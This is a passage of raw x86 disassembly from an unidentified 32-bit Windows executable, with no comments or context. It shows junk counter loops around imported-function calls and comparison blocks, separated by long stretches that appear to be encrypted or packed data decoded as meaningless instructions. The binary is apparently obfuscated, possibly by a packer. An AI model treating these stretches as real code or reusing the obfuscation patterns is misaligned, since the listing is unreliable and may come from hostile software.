  4039ed:	mov    DWORD PTR ds:0x433787,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433797
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43377b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43377b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43377b,ebx
  403a19:	cmp    DWORD PTR ds:0x43377b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43377b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433857,0x19
  403a4c:	cmp    DWORD PTR ds:0x433857,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433857,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433857
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433857,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43389b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403af1
  403acb:	retf   
  403acc:	(bad)  
  403acd:	mov    ah,0x20
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403aaa
  403ad7:	xor    eax,0x2a80c2d8
  403adc:	std    
  403add:	xchg   esp,eax
  403ade:	int    0x5a
  403ae0:	es mov esp,0x8b76b498
  403ae6:	push   ss
  403ae7:	lahf   
  403ae8:	scas   eax,DWORD PTR es:[edi]
  403ae9:	aam    0x53
  403aeb:	sbb    eax,0x868a77a0
  403af0:	int3   
  403af1:	mov    ebp,DWORD PTR [ecx+edi*8-0xa]
  403af5:	cmp    DWORD PTR [edx-0x1b341b16],esp
  403afb:	ret    0x3dc6
  403afe:	sub    eax,0x567af689
  403b03:	sbb    BYTE PTR [ebx+0x65ffb02b],ch
  403b09:	nop
  403b0a:	push   ecx
  403b0b:	test   cl,al
  403b0d:	cdq    
  403b0e:	xchg   esp,eax
  403b0f:	cmp    bh,BYTE PTR [edi]
  403b11:	shr    DWORD PTR [ecx+0x63],1
  403b14:	xor    DWORD PTR [ecx],ebx
  403b16:	fisttp QWORD PTR [esi-0x3e]
  403b19:	mov    WORD PTR [ecx+edi*2+0x75],ss
  403b1d:	out    dx,al
  403b1e:	mov    ds:0x4da3e3cb,eax
  403b23:	jmp    0x3a6136ae
  403b28:	test   al,0xc4
  403b2a:	push   ecx
  403b2b:	iret   
  403b2c:	push   eax
  403b2d:	add    al,0x1a
  403b2f:	or     ebp,DWORD PTR [ebp-0x7c]
  403b32:	cmp    ch,BYTE PTR [eax-0x70]
  403b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b36:	aas    
  403b37:	hlt    
  403b38:	dec    eax
  403b39:	xchg   ecx,eax
  403b3a:	les    edx,FWORD PTR [edi-0x66c69c83]
  403b40:	fldenv [ebp-0x425492a3]
  403b46:	loop   0x403b22
  403b48:	loopne 0x403b00
  403b4a:	data16 xor bl,BYTE PTR [edx-0x55]
  403b4e:	fidivr DWORD PTR [ecx]
  403b50:	in     eax,0xd8
  403b52:	adc    al,0x71
  403b54:	mov    edi,0xad9c1bc6
  403b59:	pusha  
  403b5a:	and    al,0x93
  403b5c:	mov    edi,0x10fd495b
  403b61:	pushf  
  403b62:	outs   dx,DWORD PTR ds:[esi]
  403b63:	fcom   st(1)
  403b65:	dec    ecx
  403b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b67:	loope  0x403b3c
  403b69:	dec    edx
  403b6a:	sbb    ah,BYTE PTR [ecx-0x4b]
  403b6d:	and    al,0x8e
  403b6f:	xchg   edx,eax
  403b70:	jge    0x403bb2
  403b72:	popf   
  403b73:	lock or DWORD PTR [ecx-0x75659900],ecx
  403b7a:	popf   
  403b7b:	cmp    eax,0x8d2c747d
  403b80:	xor    eax,0x71a30d2b
  403b85:	ret    0x86cf
  403b88:	inc    edi
  403b89:	cmp    BYTE PTR [ebp+0x73d7d51f],ah
  403b8f:	push   ecx
  403b90:	fs jmp 0x403b3f
  403b93:	shl    BYTE PTR [eax-0x2d],1
  403b96:	add    dh,BYTE PTR [esi-0x71bd7295]
  403b9c:	into   
  403b9d:	mov    edi,0x4e2f499d
  403ba2:	push   ebx
  403ba3:	mov    ebp,DWORD PTR [edx-0x24]
  403ba6:	cmp    bl,BYTE PTR [edi-0x1]
  403ba9:	adc    al,0xba
  403bab:	hlt    
  403bac:	daa    
  403bad:	test   al,0x29
  403baf:	and    bl,al
  403bb1:	mov    ss,WORD PTR [ebp+eiz*1+0x3e]
  403bb5:	xchg   ecx,eax
  403bb6:	outs   dx,BYTE PTR ds:[esi]
  403bb7:	les    eax,FWORD PTR ds:0x8c76ca33
  403bbd:	dec    ebx
  403bbe:	in     al,0x10
  403bc0:	pop    ecx
  403bc1:	sub    al,cl
  403bc3:	shr    DWORD PTR [esi+0x48551974],cl
  403bc9:	xor    edx,esi
  403bcb:	test   bl,dl
  403bcd:	cld    
  403bce:	jp     0x403b97
  403bd0:	mov    al,ds:0x226f8622
  403bd5:	test   eax,0x190f5b95
  403bda:	sbb    eax,0xf30cc6c7
  403bdf:	push   es
  403be0:	mov    ds:0xda0d420a,al
  403be5:	std    
  403be6:	sbb    al,0x1e
  403be8:	icebp  
  403be9:	mov    ebp,0xc8d052f1
  403bee:	mov    esi,0x22d8b9c9
  403bf3:	popa   
  403bf4:	xor    eax,0x55e3217
  403bf9:	jb     0x403b9c
  403bfb:	fs lahf 
  403bfd:	sahf   
  403bfe:	xor    al,0xa3
  403c00:	inc    edx
  403c01:	aam    0x27
  403c03:	xor    al,0x75
  403c05:	repnz loopne 0x403bfe
  403c08:	nop
  403c09:	add    BYTE PTR [ebx],ch
  403c0b:	dec    ebx
  403c0c:	cmp    al,0xc
  403c0e:	jb     0x403bf6
  403c10:	mov    esi,0x8c7e85b1
  403c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c16:	fidiv  WORD PTR [ecx]
  403c18:	jmp    0x43ba:0x5417fdc0
  403c1f:	out    dx,eax
  403c20:	mov    ds:0x8face616,eax
  403c25:	outs   dx,BYTE PTR ds:[esi]
  403c26:	dec    ecx
  403c27:	mov    BYTE PTR [eax],bl
  403c29:	fnstsw WORD PTR [edx-0x5d3359e1]
  403c2f:	jmp    0x403c75
  403c31:	jg     0x403bdf
  403c33:	jbe    0x403c96
  403c35:	imul   esp,DWORD PTR ds:0x946ee410,0x67511d45
  403c3f:	daa    
  403c40:	bswap  esp
  403c42:	mov    WORD PTR [esi],es
  403c44:	pop    edx
  403c45:	or     eax,0xe61ddb08
  403c4a:	jp     0x403c07
  403c4c:	add    ebx,DWORD PTR [esi-0x79d50139]
  403c52:	sbb    bh,ah
  403c54:	jge    0x403c0e
  403c56:	jb     0x403c0a
  403c58:	xchg   edi,eax
  403c59:	stos   DWORD PTR es:[edi],eax
  403c5a:	data16 js 0x403c53
  403c5d:	repz cmp al,0x18
  403c60:	fwait
  403c61:	hlt    
  403c62:	sub    BYTE PTR [esi+edx*1+0x7a],bl
  403c66:	push   ss
  403c67:	call   0x319b:0x6cb165d
  403c6e:	call   0xdfc3:0x10b3b2f5
  403c75:	mov    eax,ds:0xab35b1ed
  403c7a:	nop
  403c7b:	jmp    0x403cc9
  403c7d:	test   DWORD PTR [ebx],edx
  403c7f:	jmp    0x2a60:0xba4ca255
  403c86:	sub    eax,0x3b4c991
  403c8b:	dec    esp
  403c8c:	cmp    al,0xc2
  403c8e:	out    0xe9,al
  403c90:	adc    BYTE PTR [esi+edi*8-0x45],ah
  403c94:	ret    
  403c95:	mov    ah,0x3d
  403c97:	ins    DWORD PTR es:[edi],dx
  403c98:	(bad)  
  403c99:	push   esi
  403c9a:	jnp    0x403cb4
  403c9c:	clc    
  403c9d:	(bad)  
  403c9e:	dec    esi
  403c9f:	(bad)  
  403ca0:	fbld   TBYTE PTR [eax-0x5dd5d322]
  403ca6:	xchg   esp,eax
  403ca7:	fistp  QWORD PTR [ebx+0x56]
  403caa:	ror    edx,cl
  403cac:	ss jb  0x403c52
  403caf:	xor    eax,0xc892292d
  403cb4:	adc    eax,edx
  403cb6:	popf   
  403cb7:	addr16 inc eax
  403cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cba:	stos   BYTE PTR es:[edi],al
  403cbb:	xchg   dl,al
  403cbd:	arpl   sp,bx
  403cbf:	iret   
  403cc0:	sub    eax,0xb7573933
  403cc5:	fild   WORD PTR [edx-0x25e8f283]
  403ccb:	inc    ecx
  403ccc:	cmp    al,0xb5
  403ccf:	xchg   ebx,eax
  403cd0:	cmp    ch,BYTE PTR [ecx+0x61d8132]
  403cd6:	inc    ecx
  403cd7:	sub    DWORD PTR [edi],esp
  403cd9:	repnz es push cs
  403cdc:	xchg   ebx,eax
  403cdd:	and    bh,bh
  403cdf:	sub    eax,0xdadd2afd
  403ce4:	(bad)  
  403ce5:	jmp    0x31bf:0x67cbe794
  403cec:	ins    DWORD PTR es:[edi],dx
  403ced:	out    dx,al
  403cee:	es mov edx,0x22dfcbb1
  403cf4:	sbb    al,0x80
  403cf6:	inc    eax
  403cf7:	xor    ah,0xa8
  403cfa:	pop    esi
  403cfb:	mov    ds:0x1062795b,al
  403d00:	pop    ss
  403d01:	imul   eax,DWORD PTR [ecx-0x6094a724],0x42
  403d08:	sahf   
  403d09:	fdivr  QWORD PTR ds:0x977443c0
  403d0f:	dec    eax
  403d10:	sub    ebp,edi
  403d12:	mov    esp,DWORD PTR [ecx-0x1db61cca]
  403d18:	sbb    ah,bl
  403d1a:	ror    bl,0x81
  403d1d:	cmp    DWORD PTR [edi],0x1
  403d20:	and    edi,ecx
  403d22:	lods   al,BYTE PTR ds:[esi]
  403d23:	xor    ecx,DWORD PTR [esi-0x36d5d44e]
  403d29:	rcr    ch,0xce
  403d2c:	dec    ebp
  403d2d:	mov    al,ds:0xbf8c46f8
  403d32:	je     0x403d53
  403d34:	mov    esp,0x4089bcb5
  403d39:	out    0x88,eax
  403d3b:	ret    
  403d3c:	aaa    
  403d3d:	add    al,0x9
  403d3f:	xchg   ebx,eax
  403d40:	mov    al,0x74
  403d42:	in     eax,dx
  403d43:	nop
  403d44:	lahf   
  403d45:	mov    DWORD PTR [ecx],ebp
  403d47:	sub    eax,0x8e975952
  403d4c:	popf   
  403d4d:	in     eax,dx
  403d4e:	scas   al,BYTE PTR es:[edi]
  403d4f:	aas    
  403d50:	cmp    eax,0x957fe083
  403d55:	cmp    DWORD PTR [eax+0x1],edx
  403d58:	repz sbb eax,0xfe80359
  403d5e:	inc    ebp
  403d5f:	sub    eax,0x709dc852
  403d64:	dec    edi
  403d65:	add    eax,0x69b2d62e
  403d6a:	(bad)  
  403d6b:	mov    ch,0xc
  403d6d:	mov    DWORD PTR [eax-0x64],eax
  403d70:	sbb    BYTE PTR [esi],bl
  403d72:	add    al,0xbc
  403d74:	dec    eax
  403d75:	cmp    eax,0xd71fe8c2
  403d7a:	fiadd  WORD PTR [esi-0xfe41ccb]
  403d80:	and    eax,0x5af909ac
  403d85:	mov    ecx,0x4faeef5
  403d8a:	jl     0x403d7b
  403d8c:	stos   DWORD PTR es:[edi],eax
  403d8d:	or     esp,DWORD PTR [edx+0x4bf7d4f1]
  403d93:	mov    esp,0xdca0257c
  403d98:	inc    edi
  403d99:	cmc    
  403d9a:	inc    esi
  403d9b:	aad    0x1f
  403d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d9e:	mov    dh,BYTE PTR [edi+ebp*2+0x1b]
  403da2:	add    eax,0xb3060064
  403da7:	cmp    DWORD PTR [edx-0x22707896],edx
  403dad:	(bad)  
  403daf:	jne    0x403d53
  403db1:	fst    QWORD PTR [ebx-0xb]
  403db4:	pop    esi
  403db5:	sbb    edi,DWORD PTR [ebx+0x7]
  403db8:	jge    0x403db5
  403dba:	popa   
  403dbb:	ins    DWORD PTR es:[edi],dx
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffff96
  403e75:	jle    0x403e84
  403e77:	mov    bh,0xa
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e93
  403e81:	mov    al,0x3
  403e83:	jns    0x403e26
  403e85:	inc    esi
  403e86:	sbb    esp,edi
  403e88:	cld    
  403e89:	int    0x8a
  403e8b:	int    0x27
  403e8d:	sub    edx,edx
  403e8f:	arpl   WORD PTR [ecx-0x7e67eee6],cx
  403e95:	jns    0x403eeb
  403e97:	jae    0x403f01
  403e99:	push   edx
  403e9a:	sbb    DWORD PTR [ecx+0x5c],0x6b56dd33
  403ea1:	dec    edx
  403ea2:	out    0xd9,eax
  403ea4:	retf   0x2d44
  403ea7:	clc    
  403ea8:	ins    BYTE PTR es:[edi],dx
  403ea9:	test   BYTE PTR [eax+0x1a870],bh
  403eaf:	pop    ebp
  403eb0:	xor    al,0xf7
  403eb2:	inc    esi
  403eb3:	loopne 0x403e39
  403eb5:	push   ss
  403eb6:	(bad)  
  403eb7:	sub    edx,DWORD PTR [edx-0xc]
  403eba:	(bad)  
  403ebb:	sub    eax,0xf1c7f844
  403ec0:	test   BYTE PTR [eax+0x49d15e4f],cl
  403ec6:	jne    0x403eb8
  403ec8:	mov    dl,0xba
  403eca:	mov    ds:0x5ff461e7,al
  403ecf:	push   ds
  403ed0:	ins    BYTE PTR es:[edi],dx
  403ed1:	add    ecx,DWORD PTR cs:[eax+0x4122eecf]
  403ed8:	sbb    al,0xd2
  403eda:	inc    edi
  403edb:	test   cl,cl
  403edd:	jge    0x403f23
  403edf:	xor    al,0xb7
  403ee1:	lock fld QWORD PTR [eax+eiz*1-0x71e23c20]
  403ee9:	out    dx,al
  403eea:	sub    DWORD PTR [edi+esi*4],edx
  403eed:	ins    BYTE PTR es:[edi],dx
  403eee:	pop    ecx
  403eef:	dec    esi
  403ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ef1:	mov    bh,0x84
  403ef3:	mov    esp,0xcb095c45
  403ef8:	retf   
  403ef9:	fmul   DWORD PTR [esi-0x7239f492]
  403eff:	pop    esi
  403f00:	icebp  
  403f01:	pop    eax
  403f02:	cmp    bh,dh
  403f04:	pop    eax
  403f05:	rcl    al,cl
  403f07:	dec    edi
  403f08:	int    0xdd
  403f0a:	xlat   BYTE PTR ds:[ebx]
  403f0b:	cdq    
  403f0c:	inc    eax
  403f0d:	aaa    
  403f0e:	xchg   edx,eax
  403f0f:	loope  0x403f01
  403f11:	and    cl,cl
  403f13:	xchg   ecx,eax
  403f14:	arpl   WORD PTR [ebp-0x19effbaf],ax
  403f1a:	adc    bh,ah
  403f1c:	jae    0x403f7c
  403f1e:	int    0xda
  403f20:	(bad)  
  403f21:	rol    BYTE PTR [ebx-0x4e04c648],0x16
  403f28:	int3   
  403f29:	jle    0x403f0d
  403f2b:	cld    
  403f2c:	arpl   WORD PTR [eax],dx
  403f2e:	jp     0x403f2b
  403f30:	test   edi,esp
  403f32:	jmp    0x403ed4
  403f34:	iret   
  403f35:	mov    ecx,DWORD PTR [ecx+0x158bdbb1]
  403f3b:	dec    edi
  403f3c:	adc    esp,DWORD PTR [ebx-0x579e5cae]
  403f42:	sbb    al,0xbf
  403f44:	cdq    
  403f45:	inc    ebx
  403f46:	or     eax,0x628a63ea
  403f4b:	test   al,0xb8
  403f4d:	(bad)  
  403f4f:	jno    0x403f85
  403f51:	sahf   
  403f52:	add    edi,DWORD PTR [ebx+0x2985d9ba]
  403f58:	or     eax,0x2b139dc3
  403f5d:	and    BYTE PTR [esi],al
  403f5f:	test   al,0x4a
  403f61:	xchg   edx,eax
  403f62:	inc    edi
  403f63:	push   cs
  403f64:	or     eax,0xd81ea562
  403f69:	(bad)  
  403f6b:	cmp    edi,DWORD PTR [ebp+0x4f]
  403f6e:	pop    ebp
  403f6f:	push   0x24
  403f71:	das    
  403f72:	nop
  403f73:	rcl    DWORD PTR [ecx],0x49
  403f76:	das    
  403f77:	not    DWORD PTR [esi-0x3a]
  403f7a:	mov    edx,0x69190a60
  403f7f:	mov    esi,0x5d2810ea
  403f84:	sbb    DWORD PTR [edx],edi
  403f86:	shl    BYTE PTR [eax+0x22],0xaf
  403f8a:	mov    ecx,0x28fa51f8
  403f8f:	jb     0x403f9c
  403f91:	les    edx,FWORD PTR [edx+0xf]
  403f94:	add    eax,0xc6bf56ad
  403f99:	mov    dh,0x66
  403f9b:	ret    
  403f9c:	cmp    al,0x5d
  403f9e:	jb     0x404014
  403fa0:	add    eax,0xf60e59b3
  403fa5:	retf   
  403fa6:	dec    edi
  403fa7:	sub    ebp,eax
  403fa9:	jmp    0xc317b98
  403fae:	or     eax,0xf8382a38
  403fb3:	scas   eax,DWORD PTR es:[edi]
  403fb4:	add    edi,DWORD PTR [ebp+0x38730f1c]
  403fba:	sbb    bl,BYTE PTR [ebp+0x5b]
  403fbd:	push   ebp
  403fbe:	lea    ecx,[edx-0x43]
  403fc1:	xor    BYTE PTR [ebx+ebx*8-0x4ddbe35b],al
  403fc8:	xchg   esp,eax
  403fc9:	xchg   ebx,eax
  403fca:	ret    0x8b81
  403fcd:	sbb    ah,BYTE PTR [edx+0x8]
  403fd0:	arpl   WORD PTR [edx+ebx*8-0x70],dx
  403fd4:	ins    DWORD PTR es:[edi],dx
  403fd5:	mov    bl,0xcd
  403fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd8:	add    ecx,0xd3e06908
  403fde:	lds    ecx,FWORD PTR ds:0x1f983957
  403fe4:	fs mov bl,0xcd
  403fe7:	pushf  
  403fe8:	je     0x403f9c
  403fea:	pop    eax
  403feb:	int3   
  403fec:	les    edx,FWORD PTR [ebp+0x29]
  403fef:	push   eax
  403ff0:	and    al,ch
  403ff2:	ss iret 
  403ff4:	sti    
  403ff5:	cs dec edx
  403ff7:	ja     0x40401c
  403ff9:	push   ss
  403ffa:	scas   eax,DWORD PTR es:[edi]
  403ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ffc:	pushf  
  403ffd:	pop    esi
  403ffe:	lods   eax,DWORD PTR ds:[esi]
  403fff:	mov    BYTE PTR [ebx-0x66],al
  404002:	lods   al,BYTE PTR ds:[esi]
  404003:	jae    0x404061
  404005:	xor    eax,DWORD PTR [ebx-0x22f8044b]
  40400b:	push   ss
  40400c:	inc    edx
  40400d:	jb     0x40404e
  40400f:	dec    edi
  404010:	in     al,dx
  404011:	cdq    
  404012:	pop    es
  404013:	ins    BYTE PTR es:[edi],dx
  404014:	sub    DWORD PTR [edi],ebx
  404016:	cmp    al,0xbd
  404018:	mov    ebp,0x3a713d1c
  40401d:	adc    DWORD PTR [ebx+0x7eaaf9fe],edi
  404023:	stos   DWORD PTR es:[edi],eax
  404024:	dec    esi
  404025:	push   ds
  404026:	and    ebx,esi
  404028:	jge    0x40408e
  40402a:	(bad)  
  40402c:	pop    ebx
  40402d:	and    esp,DWORD PTR [esi-0x7e]
  404030:	test   eax,0xeb598eca
  404035:	in     eax,0xad
  404037:	jmp    0x5152:0x71d79c24
  40403e:	or     al,0x5b
  404040:	cwde   
  404041:	pop    eax
  404042:	aad    0xca
  404044:	add    al,0x28
  404046:	rcl    edi,0x33
  404049:	adc    eax,0x8dc14be7
  40404e:	pusha  
  40404f:	mov    bl,0x8
  404051:	sbb    al,0x5f
  404053:	jle    0x403ff6
  404055:	mov    ds:0x62d56dd9,al
  40405a:	retf   0xd0a5
  40405d:	clc    
  40405e:	pop    eax
  40405f:	hlt    
  404060:	ret    
  404061:	daa    
  404062:	in     al,dx
  404063:	sub    eax,edi
  404065:	pop    es
  404066:	int    0xd8
  404068:	and    BYTE PTR [edx+0x51],ch
  40406b:	clc    
  40406c:	pop    ecx
  40406d:	outs   dx,BYTE PTR ds:[esi]
  40406e:	test   BYTE PTR [ebx-0x2c],0x32
  404072:	mov    ah,0x59
  404074:	jne    0x4040cb
  404076:	push   esi
  404077:	into   
  404078:	mov    edi,?
  40407a:	mov    al,0x6
  40407c:	xor    eax,0xe5dfac05
  404081:	add    ecx,ebx
  404083:	cmp    eax,0xe3bdfe11
  404088:	xor    eax,0x60114988
  40408d:	sub    DWORD PTR [edi-0x4a],eax
  404090:	inc    esi
  404091:	dec    ecx
  404092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404093:	sbb    DWORD PTR [eax+ebx*1-0x7a],0xffffff9f
  404098:	lahf   
  404099:	je     0x4040db
  40409b:	mov    al,0x1b
  40409d:	mov    ebp,0xdf84ea64
  4040a2:	push   es
  4040a3:	repnz mov cl,0x9
  4040a6:	imul   esi,esi,0xa349cf
  4040ac:	cs jp  0x40406a
  4040af:	aas    
  4040b0:	hlt    
  4040b1:	mov    edx,0xbc8724e2
  4040b6:	sub    edi,esi
  4040b8:	mov    al,0x71
  4040ba:	in     al,0x27
  4040bc:	inc    edx
  4040bd:	push   ds
  4040be:	xor    al,0xa7
  4040c0:	adc    BYTE PTR [ecx-0x5994dd1a],bh
  4040c6:	mov    ebp,0x5fc0cf6b
  4040cb:	pop    esp
  4040cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040cd:	loope  0x4040b3
  4040cf:	add    BYTE PTR [ebx],dl
  4040d1:	mov    cl,0x17
  4040d3:	push   0xffffffc2
  4040d5:	mov    es,WORD PTR [ebx-0x80]
  4040d8:	xor    eax,0xee814e54
  4040dd:	js     0x4040ce
  4040df:	icebp  
  4040e0:	xor    eax,0x6c7951dd
  4040e5:	(bad)  [edx+0x52179401]
  4040eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040ec:	js     0x4040fb
  4040ee:	arpl   sp,dx
  4040f0:	push   0x70
  4040f2:	popf   
  4040f3:	aas    
  4040f4:	jne    0x4040fd
  4040f6:	popf   
  4040f7:	add    al,0xc8
  4040f9:	ds fs (bad) 
  4040fd:	jno    0x404176
  4040ff:	mov    bh,BYTE PTR [edi+0x66db8ee1]
  404105:	mov    eax,edx
  404107:	(bad)  
  404108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404109:	xor    BYTE PTR [ecx-0x54],cl
  40410c:	(bad)  
  40410d:	sbb    ecx,DWORD PTR [edx-0x6f]
  404110:	jmp    0x167:0xcb9592ed
  404117:	int    0xb3
  404119:	outs   dx,BYTE PTR ds:[esi]
  40411a:	mov    al,0x2
  40411c:	xchg   ecx,eax
  40411d:	and    ah,BYTE PTR [ebx-0x1f]
  404120:	xchg   edx,eax
  404121:	inc    ebx
  404122:	scas   eax,DWORD PTR es:[edi]
  404123:	cmp    al,0xe
  404125:	add    al,0x74
  404127:	cmp    BYTE PTR [ecx-0x6e],ch
  40412a:	call   FWORD PTR [edx-0x8]
  40412d:	push   edx
  40412e:	repnz retf 
  404130:	sub    ecx,edi
  404132:	dec    ebx
  404133:	and    eax,0x4dbf0f85
  404138:	push   ss
  404139:	push   ebp
  40413a:	mov    bh,0x71
  40413c:	adc    DWORD PTR [eax],esp
  40413e:	adc    eax,0x6971c042
  404143:	test   DWORD PTR [esi-0x7e],edi
  404146:	or     eax,0x2d97ac3b
  40414b:	mov    al,ds:0x5b1355f4
  404150:	loopne 0x40419c
  404152:	jp     0x4040ec
  404154:	pusha  
  404155:	in     eax,0xe3
  404157:	and    eax,0x489158d3
  40415c:	dec    ebx
  40415d:	push   esi
  40415e:	call   0x615eff58
  404163:	or     esi,edx
  404165:	test   eax,0xda3bdf2b
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [ecx+0x7b],cl
  40418c:	loop   0x4041df
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x404144
  404197:	sub    edx,DWORD PTR [eax-0x7e]
  40419a:	or     dh,dh
  40419c:	fdivrp st(3),st
  40419e:	push   eax
  40419f:	sub    DWORD PTR [ebx-0x7b],ebx
  4041a2:	jge    0x4041c6
  4041a4:	sbb    al,BYTE PTR [ecx]
  4041a6:	dec    esp
  4041a7:	lods   eax,DWORD PTR ds:[esi]
  4041a8:	popa   
  4041a9:	mov    al,ds:0x80ad0caa
  4041ae:	mov    al,ch
  4041b0:	add    cl,dh
  4041b2:	jmp    DWORD PTR [edi]
  4041b4:	mov    ebx,0x7446035f
  4041b9:	dec    edx
  4041ba:	lea    edi,[esp+esi*2-0x3a]
  4041be:	push   esi
  4041bf:	push   ss
  4041c0:	push   ebx
  4041c1:	add    edx,edx
  4041c3:	cdq    
  4041c4:	add    bh,BYTE PTR [edi]
  4041c6:	pop    esi
  4041c7:	xchg   edx,eax
  4041c8:	les    esi,FWORD PTR [eax-0x1f1fd6ce]
  4041ce:	out    0x28,eax
  4041d0:	push   0xd01ed609
  4041d5:	and    eax,0x9f0a648f
  4041da:	inc    esp
  4041db:	sub    DWORD PTR [eax+ecx*1],ebp
  4041de:	mov    edx,0x850215c0
  4041e3:	rcl    BYTE PTR es:[ebx+0x1b],0x5d
  4041e8:	outs   dx,BYTE PTR ds:[esi]
  4041e9:	sub    ch,BYTE PTR [ebp+edx*1-0x61724f6e]
  4041f0:	cmp    eax,0x8caa922e
  4041f5:	add    DWORD PTR [eax],0x47
  4041f8:	addr16 xor eax,0xa7246866
  4041fe:	call   0x6553ac6b
  404203:	cld    
  404204:	push   0x2e
  404206:	pusha  
  404207:	dec    ebp
  404208:	sub    DWORD PTR [edx+0x430e04ac],esi
  40420e:	gs cwde 
